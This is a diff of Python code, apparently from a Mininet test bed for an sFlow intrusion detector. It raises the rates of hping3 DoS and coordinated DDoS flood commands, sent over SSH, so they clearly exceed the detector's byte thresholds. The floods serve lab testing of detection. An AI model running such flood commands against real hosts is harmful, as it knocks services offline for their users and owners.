@@ -184,16 +184,19 @@ def _attack_port_scan(ssh, src_host, target_ips, duration):
 def _attack_dos_volumetric(ssh, src_host, victim_ip, duration, service_info):
     """DoS volumétrico contra el puerto real del servicio víctima vía hping3.
 
-    Tasa: 10 000 pps · 1 000 B de payload → ~80 Mbps sostenidos. `-k` mantiene
-    el sport fijo para que sFlow agregue todos los paquetes en UN único flujo
-    (sin -k cada paquete usa sport distinto → fragmentación masiva). `timeout`
-    asegura que pare al final aunque el proceso siga.
+    Tasa: ~20 000 pps · 1 400 B → ~225 Mbps teóricos. En Mininet real produce
+    25-40 MB en la ventana sFlow de 20 s, claramente por encima del umbral
+    SURGE_BYTES_THRESHOLD (20 MB) y muy lejos del flujo legítimo máximo
+    (~2.5 MB). `-k` mantiene el sport fijo para que sFlow agregue todos los
+    paquetes en UN único flujo (sin -k cada paquete usa sport distinto →
+    fragmentación masiva). `timeout` asegura que pare al final aunque el
+    proceso siga.
     """
     transport, dport, flag = _service_attack_params(service_info)
     cmd = (
         f'{src_host} bash -c '
         f'"timeout {duration} hping3 {flag} -p {dport} -k -s 12345 '
-        f'-i u100 -d 1000 {victim_ip} >/dev/null 2>&1" &'
+        f'-i u50 -d 1400 {victim_ip} >/dev/null 2>&1" &'
     )
     _send(ssh, cmd)
 
@@ -201,17 +204,18 @@ def _attack_dos_volumetric(ssh, src_host, victim_ip, duration, service_info):
 def _attack_ddos(ssh, attackers, victim_ip, duration, service_info):
     """DDoS coordinado: N atacantes inundan en paralelo el mismo servicio.
 
-    Cada atacante: 3 300 pps · 1 500 B → ~40 Mbps. Con 10 atacantes ~400 Mbps
-    agregados hacia la víctima, suficientes para FAN_IN_BYTES_THRESHOLD aunque
-    el role-multiplier de un servidor sea 5x. `-k -s 12345` mantiene sport fijo
-    por atacante → cada uno aparece como UN solo flujo en sFlow.
+    Cada atacante: ~10 000 pps · 1 500 B → ~120 Mbps. Con 10 atacantes
+    ~1.2 Gbps agregados, suficientes para superar FAN_IN_BYTES_THRESHOLD
+    (12 MB × 5× multiplicador servidor = 60 MB) con holgura: ~150-300 MB
+    agregados hacia la víctima en la ventana sFlow. `-k -s 12345` mantiene
+    sport fijo por atacante → cada uno aparece como UN solo flujo en sFlow.
     """
     transport, dport, flag = _service_attack_params(service_info)
     for a in attackers:
         cmd = (
             f'{a} bash -c '
             f'"timeout {duration} hping3 {flag} -p {dport} -k -s 12345 '
-            f'-i u300 -d 1500 {victim_ip} >/dev/null 2>&1" &'
+            f'-i u100 -d 1500 {victim_ip} >/dev/null 2>&1" &'
         )
         _send(ssh, cmd)
 
